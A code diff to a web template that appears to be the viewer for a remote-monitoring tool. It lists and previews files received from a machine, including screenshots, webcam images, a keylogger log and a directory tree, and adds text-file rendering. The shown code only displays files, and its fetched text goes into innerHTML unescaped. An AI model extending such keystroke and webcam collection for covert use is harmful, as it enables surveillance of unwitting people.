@@ -79,7 +79,7 @@
 
 {% endblock %} {% block script %}
 <script>
-	let images = [
+	let received_files = [
 		{
 			service: "Capture screen",
 			name: "screenshot.png",
@@ -90,39 +90,58 @@
 			name: "webcam_image.png",
 			path: "../static/assets/received_files/webcam_image.png",
 		},
+		{
+			service: "Key logger",
+			name: "key_logger.log",
+			path: "../static/assets/received_files/key_logger.log",
+		},
+		{
+			service: "Directory tree",
+			name: "directory_tree.txt",
+			path: "../static/assets/received_files/directory_tree.txt",
+		},
 	];
 
-	window.onload = function () {
+	window.onload = async function () {
 		body = document.getElementById("email_body");
-
-		for (let i = 0; i < images.length; i++) {
+		for (let i = 0; i < received_files.length; i++) {
 			console.log(
-				`🚀  CheckFileExist('${images[i].name}'):`,
-				CheckFileExist(images[i]["path"]),
+				`🚀  CheckFileExist('${received_files[i].name}'):`,
+				CheckFileExist(received_files[i]["path"]),
 			);
-			if (CheckFileExist(images[i]["path"])) {
+			if (CheckFileExist(received_files[i]["path"])) {
 				body.innerHTML += `
-					<div class="image-show">
-						<p class="m-0"><b>${images[i]["service"]}:</b></p>
-						<button 
-							class="position-relative" 
-							data-bs-toggle="modal" 
-							data-bs-target="#exampleModal-${i}"  
-							onmouseover="showImageIcon(true, ${i})"  
+					<div class="image-show mb-2">
+						<p class="m-0"><b>${received_files[i]["service"]}:</b></p>
+						<button
+							class="position-relative"
+							data-bs-toggle="modal"
+							data-bs-target="#exampleModal-${i}"
+							onmouseover="showImageIcon(true, ${i})"
 							onmouseout="showImageIcon(false, ${i})"
 						>
-							<img  
-								src="${images[i]["path"]}" 
-								alt="${images[i]["name"]}" 
-								/>
+						${
+							isImage(received_files[i]["name"])
+								? `<img
+									src="${received_files[i]["path"]}"
+									alt="${received_files[i]["name"]}"
+									/>`
+								: `<img src="../static/assets/background/text-image.png" alt="text image icon"/>`
+						}
+
 							<div id="image-text-${i}" class="invisible">
 								<div id="image-txt">
-									<img src="../static/assets/icons/image.png" alt="image icon"/>
-									<p class="m-0">${images[i]["name"]}</p>
+										${
+											isImage(received_files[i]["name"])
+												? `<img src="../static/assets/icons/image.png" alt="image icon"/>`
+												: `<img src="../static/assets/icons/text.png" alt="text icon"/>`
+										}
+						
+									<p class="m-0 ps-2">${received_files[i]["name"]}</p>
 								</div>
 							</div>
 						</button>
-						<br/><br/>
+						
 					</div>
 
 					<div class="modal fade" id="exampleModal-${i}" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
@@ -135,22 +154,32 @@
 									>
 										<span class="action-dot dot-red"></span>
 									</button>
-									<h5 class="modal-title w-50 text-center" id="modal-label">${images[i]["name"]}</h5>
-									<button	
-										class="download-img me-3" 
-										onclick="DownloadImage('${images[i]["path"]}')"
+									<h5 class="modal-title w-50 text-center" id="modal-label">${
+										received_files[i]["name"]
+									}</h5>
+									<button
+										class="download-img me-3"
+										onclick="DownloadImage('${received_files[i]["path"]}')"
 										data-bs-toggle="tooltip"
 										data-bs-placement="top"
 										title="Download"
-									>	
+									>
 										<img  src="../static/assets/icons/download.png" alt="download icon" />
 									</button>
 								</div>
 								<div class="modal-body">
-									<img  
-									src="${images[i]["path"]}" 
-									alt="${images[i]["name"]}" 
-									/>
+									${
+										isImage(received_files[i]["name"])
+											? `
+											<img
+												src="${received_files[i]["path"]}"
+												alt="${received_files[i]["name"]}"
+											/>`
+											: `
+											<pre class="text-break">
+												${await readTextFile(received_files[i]["path"])}
+											</pre>`
+									}
 								</div>
 							</div>
 						</div>
@@ -159,6 +188,22 @@
 			}
 		}
 	};
+
+	function isImage(file_name) {
+		return (
+			file_name.endsWith(".png") ||
+			file_name.endsWith(".jpg") ||
+			file_name.endsWith(".jpeg")
+		);
+	}
+
+	async function readTextFile(file_path) {
+		const response = await fetch(file_path);
+		let text = await response.text();
+		console.log("text: ", text);
+		console.log("type:", typeof text);
+		return text;
+	}
 
 	function showImageIcon(is_show, idx) {
 		id = "image-text-" + idx;
